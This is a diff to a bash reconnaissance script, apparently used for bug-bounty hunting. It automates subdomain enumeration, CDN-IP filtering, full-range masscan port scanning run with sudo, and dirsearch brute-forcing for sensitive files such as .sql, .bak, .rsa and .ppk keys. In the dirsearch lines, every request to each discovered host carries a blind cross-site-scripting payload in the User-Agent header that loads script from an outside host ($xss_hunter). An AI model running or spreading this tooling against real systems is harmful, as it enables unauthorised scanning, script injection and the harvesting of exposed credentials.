@@ -34,9 +34,11 @@ scanned () {
 message "[%2B]%20Initiating%20scan%20%3A%20$1%20[%2B]"
 date
 
+[ ! -f ~/tools/nameservers.txt ] && wget https://public-dns.info/nameservers.txt -O ~/tools/nameservers.txt
+
 echo "[+] AMASS SCANNING [+]"
 if [ ! -f ~/recon/$1/$1-amass.txt ] && [ ! -z $(which amass) ]; then
-	amass enum -passive -d $1 -o ~/recon/$1/$1-amass.txt
+	amass enum -passive -rf ~/tools/nameservers.txt -d $1 -o ~/recon/$1/$1-amass.txt
 	amasscan=`scanned ~/recon/$1/$1-amass.txt`
 	message "Amass%20Found%20$amasscan%20subdomain(s)%20for%20$1"
 	echo "[+] Amass Found $amasscan subdomains"
@@ -110,19 +112,6 @@ else
 fi
 sleep 5
 
-echo "[+] CRT.SH SCANNING [+]"
-if [ ! -f ~/recon/$1/$1-crt.txt ]; then
-	crtsh=$(curl "https://crt.sh/?q=%25.$1&output=json" --silent | jq '.[]|.name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u)
-	for target in $crtsh; do curl "https://crt.sh/?q=%25.$target&output=json" --silent | jq '.[]|.name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u >> ~/recon/$1/$1-crt.txt; done
-	crt=`scanned ~/recon/$1/$1-crt.txt`
-	message "CRT.SH%20Found%20$crt%20subdomain(s)%20for%20$1"
-	echo "[+] CRT.sh Found $crt subdomains"
-else
-	message "[-]%20Skipping%20CRT.SH%20Scanning%20for%20$1"
-	echo "[!] Skipping ..."
-fi
-sleep 5
-
 echo "[+] GOBUSTER SCANNING [+]"
 if [ ! -f ~/recon/$1/$1-gobuster.txt ] && [ ! -z $(which gobuster) ]; then
 	[ ! -f ~/tools/all.txt ] && wget "https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt" -O ~/tools/all.txt
@@ -138,6 +127,22 @@ else
 fi
 sleep 5
 
+
+echo "[+] CRT.SH SCANNING [+]"
+if [ ! -f ~/recon/$1/$1-crt.txt ]; then
+	for crt in `cat ~/recon/$1/$1-gobuster.txt ~/recon/$1/$1-project-sonar.txt ~/recon/$1/$1-assetfinder.txt ~/recon/$1/$1-aquatone.txt ~/recon/$1/$1-subfinder.txt ~/recon/$1/$1-findomain.txt ~/recon/$1/$1-amass.txt | sort -u`; do
+		crtsh=$(curl "https://crt.sh/?q=%25.$crt&output=json" --silent | jq '.[]|.name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u)
+		for target in $crtsh; do curl "https://crt.sh/?q=%25.$target&output=json" --silent | jq '.[]|.name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u >> ~/recon/$1/$1-crt.txt; done
+	done	
+	crt=`scanned ~/recon/$1/$1-crt.txt`
+	message "CRT.SH%20Found%20$crt%20subdomain(s)%20for%20$1"
+	echo "[+] CRT.sh Found $crt subdomains"
+else
+	message "[-]%20Skipping%20CRT.SH%20Scanning%20for%20$1"
+	echo "[!] Skipping ..."
+fi
+sleep 5
+
 ## Deleting all the results to less disk usage
 cat ~/recon/$1/$1-amass.txt ~/recon/$1/$1-project-sonar.txt ~/recon/$1/$1-findomain.txt ~/recon/$1/$1-subfinder.txt ~/recon/$1/$1-aquatone.txt ~/recon/$1/$1-assetfinder.txt ~/recon/$1/$1-crt.txt ~/recon/$1/$1-gobuster.txt | sort -uf > ~/recon/$1/$1-final.txt
 rm ~/recon/$1/$1-amass.txt ~/recon/$1/$1-project-sonar.txt ~/recon/$1/$1-findomain.txt ~/recon/$1/$1-subfinder.txt ~/recon/$1/$1-aquatone.txt ~/recon/$1/$1-assetfinder.txt ~/recon/$1/$1-crt.txt ~/recon/$1/$1-gobuster.txt
@@ -147,9 +152,8 @@ sleep 5
 echo "[+] DNSGEN & TOK SUBDOMAIN PERMUTATION [+]"
 if [ ! -f ~/recon/$1/$1-dnsgen.txt ] && [ ! -z $(which dnsgen) ] && [ ! -z $(which tok) ]; then
 	cat ~/recon/$1/$1-final.txt | sed 's/\.$//g' | tok | sort -u > ~/recon/$1/$1-final.tmp
-	[ ! -f ~/tools/nameservers.txt ] && wget https://public-dns.info/nameservers.txt -O ~/tools/nameservers.txt
 	dnsgen ~/recon/$1/$1-final.txt -w ~/recon/$1/$1-final.tmp | massdns -r ~/tools/nameservers.txt -o J --flush 2>/dev/null | jq -r .query_name | sort -u | tee -a ~/recon/$1/$1-dnsgen.tmp
-	cat ~/recon/$1/$1-dnsgen.tmp | sed 's/-\.//g' | sed 's/-\.//g' | sed 's/-\-\-\-//g' | sort -u > ~/recon/$1/$1-dnsgen.txt
+	cat ~/recon/$1/$1-dnsgen.tmp | sed 's/-\.//g' | sed 's/-\.//g' | sed 's/-\-\-\-//g' | sed 's/\.$//g' | sort -u > ~/recon/$1/$1-dnsgen.txt
 	dnsgens=`scanned ~/recon/$1/$1-dnsgen.txt`
 	message "DNSGEN%20generates%20$dnsgens%20subdomain(s)%20for%20$1"
 	echo "[+] DNSGEN generate $dnsgens subdomains"
@@ -192,6 +196,7 @@ done
 ipz=`scanned ~/recon/$1/$1-ip3.txt`
 ip_old=`scanned ~/recon/$1/$1-ip4.txt`
 message "$ipz%20non-incapsula%20IPs%20has%20been%20$collected%20in%20$1%20out%20of%20$ip_old%20IPs"
+echo "[+] $ipz non-incapsula IPs has been collected out of $ip_old IPs!"
 rm ~/recon/$1/$1-ip4.txt
 sleep 5
 
@@ -202,6 +207,7 @@ done
 ipz=`scanned ~/recon/$1/$1-ip2.txt`
 ip_old=`scanned ~/recon/$1/$1-ip3.txt`
 message "$ipz%20non-sucuri%20IPs%20has%20been%20$collected%20in%20$1%20out%20of%20$ip_old%20IPs"
+echo "[+] $ipz non-sucuri IPs has been collected out of $ip_old IPs!"
 rm ~/recon/$1/$1-ip3.txt
 sleep 5
 
@@ -212,12 +218,13 @@ done
 ipz=`scanned ~/recon/$1/$1-ip.txt`
 ip_old=`scanned ~/recon/$1/$1-ip2.txt`
 message "$ipz%20non-akamai%20IPs%20has%20been%20$collected%20in%20$1%20out%20of%20$ip_old%20IPs"
+echo "[+] $ipz non-akamai IPs has been collected out of $ip_old IPs!"
 rm ~/recon/$1/$1-ip2.txt
 sleep 5
 
 echo "[+] MASSCAN PORT SCANNING [+]"
 if [ ! -f ~/recon/$1/$1-masscan.txt ] && [ ! -z $(which masscan) ]; then
-	echo $passwordx | sudo -S masscan -p1-65535 -iL ~/recon/$1/$1-ip.txt --max-rate 10000 -oG ~/recon/$1/$1-masscan.txt
+	echo $passwordx | sudo -S masscan -p0-65535 -iL ~/recon/$1/$1-ip.txt --max-rate 10000 -oG ~/recon/$1/$1-masscan.txt
 	mass=`scanned ~/recon/$1/$1-ip.txt`
 	message "Masscan%20Scanned%20$mass%20IPs%20for%20$1"
 	echo "[+] Done masscan for scanning IPs"
@@ -433,7 +440,12 @@ echo "[+] Done 401 Scanning for $1"
 sleep 5
 
 echo "[+] DirSearch Scanning for Sensitive Files [+]"
-cat ~/recon/$1/$1-httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u | xargs -P10 -I % sh -c "python3 ~/dirsearch/dirsearch.py -u % -e php,bak,txt,asp,aspx,jsp,html,zip,jar,sql,json,old,gz,shtml,log,swp,yaml,yml,config,save,rsa,ppk -x 400,404,301,401,500,406,503,502 -t 100 -H \"User-Agent: %22&quot;'>blahblah<script src='$xss_hunter'></script>testing\" -b --plain-text-report ~/recon/$1/dirsearch/%-dirsearch.txt"
+sub_count=$(cat ~/recon/$1/$1-httprobe.txt | wc -l)
+if (( $sub_count <= 100 )); then
+	cat ~/recon/$1/$1-httprobe.txt | sort -u | xargs -P10 -I % sh -c "filename=$(echo % | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g'); python3 ~/dirsearch/dirsearch.py -u % -e php,bak,txt,asp,aspx,jsp,html,zip,jar,sql,json,old,gz,shtml,log,swp,yaml,yml,config,save,rsa,ppk -x 400,404,301,401,500,406,503,502 -t 100 -H \"User-Agent: %22\\\"&quot;'>blahblah<script src='$xss_hunter'></script>testing\" -b --plain-text-report ~/recon/$1/dirsearch/$filename-dirsearch.txt"
+else
+	cat ~/recon/$1/$1-httprobe.txt | sort -u | head -100 | xargs -P10 -I % sh -c "filename=$(echo % | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g'); python3 ~/dirsearch/dirsearch.py -u % -e php,bak,txt,asp,aspx,jsp,html,zip,jar,sql,json,old,gz,shtml,log,swp,yaml,yml,config,save,rsa,ppk -x 400,404,301,401,500,406,503,502 -t 100 -H \"User-Agent: %22\\\"&quot;'>blahblah<script src='$xss_hunter'></script>testing\" -b --plain-text-report ~/recon/$1/dirsearch/$filename-dirsearch.txt"
+fi
 echo "[+] Done dirsearch for file and directory scanning"
 sleep 5
 
